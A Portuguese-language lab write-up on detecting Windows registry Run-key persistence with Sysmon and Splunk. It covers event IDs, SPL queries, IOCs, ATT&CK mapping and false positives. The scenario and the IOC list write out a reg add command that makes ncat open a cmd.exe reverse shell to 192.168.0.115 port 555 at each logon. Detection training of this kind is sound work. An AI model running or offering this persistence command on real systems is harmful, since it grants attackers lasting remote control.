# Lab 02 - Persistência via Registry Keys
## Objetivo
Detectar uma tentativa de persistência via registros em ambiente Windows, utilizando Sysmon como gerador de eventos e Splunk como SIEM.
## Cenário Geral
Um atacante obteve acesso inicial ao host e executa tentativas de estabelecer persistência. Para isto, ele faz upload do ncat.exe em C:\Users\vboxusers\Downloads e cria um registro de persistência no sistema para iniciar o ncat.exe conectando o prompt de comando do sistema ao atacante remoto a cada login do usuário VboxUser.
Após acesso inicial, o atacante executa o seguinte comando:
```powershell
reg add "HCKU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Persistence" /t REG_SZ /d "C:\Users\vboxuser\Downloads\ncat.exe 192.168.0.115 555 -e C:\Windows\System32\cmd.exe
```
para criar o registro via cmd/powershell.<br> <img width="1353" height="281" alt="Captura de tela 2026-06-29 124402" src="https://github.com/user-attachments/assets/349ea147-6eab-4e78-93c6-e2606f11fa7d" /><br>
## Telemetria Gerada
### Primeiro Método de Detecção: Sysmon Event ID 1
Criar um registro pelo cmd gera o evento "Process Creation" de ID 1. Buscar por eventos de Process Creation relacionados ao comando "reg" - utilidade de linha de comando para gerenciamento de registros - mostrou que o mesmo foi executado<br>
<img width="598" height="450" alt="image" src="https://github.com/user-attachments/assets/415e7c59-5d2d-4b0a-ae3c-07c4b3c28ffa" /><br>
A "command line" por sua vez revela exatamente o que foi feito: a criação de um registro de persistência na chave HKCU\Software\Microsoft\Windows\CurrentVersion\Run, amplamente utilizada por hackers para executar payloads durante o logon de um usuário.<br>
<img width="1352" height="209" alt="image" src="https://github.com/user-attachments/assets/b53d7745-97d6-4255-bff2-3c2fd6d60167" /><br>
<br>
### Segundo Método de Detecção: Sysmon Event ID 13
Outra forma de detectar este comportamento é buscando especificamente pelo evento "RegistryEvent (Value Set)" de ID 13, que descreve a criação e novos registros no sistema.<br>
<img width="575" height="89" alt="image" src="https://github.com/user-attachments/assets/5eb92f49-ebce-45e9-8892-fc186c5efc48" /><br>
A quantidade de resultados gerada por essa querie é geralmente grande devido aos eventos gerados por processos legítimos e nativos do Windows. <br>
<img width="1003" height="269" alt="image" src="https://github.com/user-attachments/assets/2f5dc9f9-55f3-4dab-9f9e-08f5c4dd7922" /><br>
Para filtrar a massividade de eventos legítimos podemos adicionar o termo "Run" a querie SPL, para buscar apenas registros feitos em alguma chave "Run" do sistema que é a mais frequente a ser explorada durante tentativas de persistência.<br>
<img width="837" height="561" alt="image" src="https://github.com/user-attachments/assets/984b6384-fc6a-4bbd-8319-8a0d30e990ed" /><br>
Com estes resultados, fica evidente que apenas 2 eventos entre eles são legítimos (criados pelo msedge) e o outro é notavelmente suspeito por utilizar o comando "reg". Expandindo o resultado vemos exatamente as mesmas informações que encontramos anteriormente:<br><img width="881" height="363" alt="image" src="https://github.com/user-attachments/assets/2bf28410-b152-4d9f-be7b-69bf9586d129" /><br>
<br>
A primeira forma de detecção busca especificamente pelo uso do utilitário "reg", a segunda porém é mais abrangente ao buscar por toda a atividade nos registros ligadas à alguma chave "Run", captando não somente eventos gerados pelo utilitário mas também por funções da WinAPi como a "RegSetKeyValue()". Portanto, o segundo método preferível ao primeiro na maioria dos casos, embora o primeiro seja mais direto acerca do modo como o atacante interagiu com os registros.<br>
## Investigação
### Quem Criou?
Analisando o evento obtido no segundo método de detecção, podemos ver que o usuário "vboxuser" foi quem criou o registro.<br:<img width="1053" height="70" alt="image" src="https://github.com/user-attachments/assets/c0149303-fe56-4fe9-9bfe-d8b3f2da241b" /><br>
### Quando Criou?
O momento exato da criação do registro fica evidente no mesmo evento utilizado para saber o usuário.<br>
<img width="149" height="66" alt="image" src="https://github.com/user-attachments/assets/6d85401b-ecb4-4142-812c-feed3fc3b92f" /><br>
No dia 29/06/2026, às 12:35:25.
### Qual Payload Será Executado?
O campo "Details" do evento retornado pelo Sysmon nos mostra que o registro guarda um comando para executar o "*ncat.exe*" dando acesso ao *cmd.exe* para o host remoto *192.168.0.115* na porta *555*.<br>
<img width="900" height="179" alt="image" src="https://github.com/user-attachments/assets/56558e7b-c0c6-46cc-9ee0-1572ea29d7df" /><br>
### Quando Será Executado?
O campo "TargetObject" mostra que o caminho para o registro criado possui um "*SID*" logo no início, indicando que o registro vale apenas para este usuário.<br>
<img width="865" height="59" alt="image" src="https://github.com/user-attachments/assets/914f4451-9f1b-4e0e-b397-27d7a792b540" /><br>
Com acesso á máquina vítima do ataque, é fácil descobrir o usuário detentor deste *SID*: o usuário vboxuser.
<br><img width="683" height="218" alt="image" src="https://github.com/user-attachments/assets/7280af50-a6c7-4c7a-8190-e1b69dfb04b7" /><br>
Por isto, pode-se concluir que o payload executará a cada logon do usuário vboxuser.
## Oportunidades de Detecção
* Criação do arquivo "ncat.exe" no diretório C:\Users\vboxuser\Downloads, pelo evento *"File Create"* de ID 11.
* Início de processo com o binário "reg.exe", pelo evento *"Process Create"* de ID 1.
* Criação do Value *"Persistence"* na chave "*Run*", pelo evento "*RegistryEvent (Value Set)*" de ID 13.
* Conexão iniciada para host desconhecido "*192.168.0.115*" na porta incomum *555*, pelo evento *"Network Connection"* de ID 3.

## Indicadores de Compromisso (IOCs)
* **IP do Invasor**: 192.168.0.115
* **Arquivo**: C:\Users\vboxuser\Downloads\ncat.exe
* **Processo**: reg.exe
* **Script de Criação de Registro**:
   ```powershell
  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Persistence" /t REG_SZ /d "C:\Users\vboxuser\Downloads\ncat.exe 192.168.0.115 555 -e C:\Windows\System32\cmd.exe" /f
   ```

## Queries SPL
* Encontrar criação de processos usando o comando "*reg*" no host "VitimaWindows":
  ```SPL
  index=main host=VitimaWindows EventDescription="Process Creation" reg
  ```
* Encontrar criação de registros em chaves "Run":
  ```SPL
  index=main host=VitimaWindows EventDescription="RegistryEvent (Value Set)" Run
  ```
  ## ATT&CK
  * T1547: Boot or Logon Autostart Execution
    * 001: Registry Run Keys / Startup Folder
  * T1219: Remote Access Tools

  ## Falsos Positivos
  Diversos serviços e programas legítimos criam e modificam registros no Windows frequentemente durante o uso do sistema. Além disto, um usuário legítimo do sistema pode criar e modificar registros para personalizar a experiência de uso ou facilitar tarefas repetitivas a cada logon.
## Conclusão
O Sysmon e o Splunk são duas ótimas ferramentas para abstrair, em poucos logs, o evento de criação de um registro. Com eles podemos traçar o momento de criação, o payload e a frequência de execução, possibilitando ações posteriores de threat hunting e incident response ao ataque.
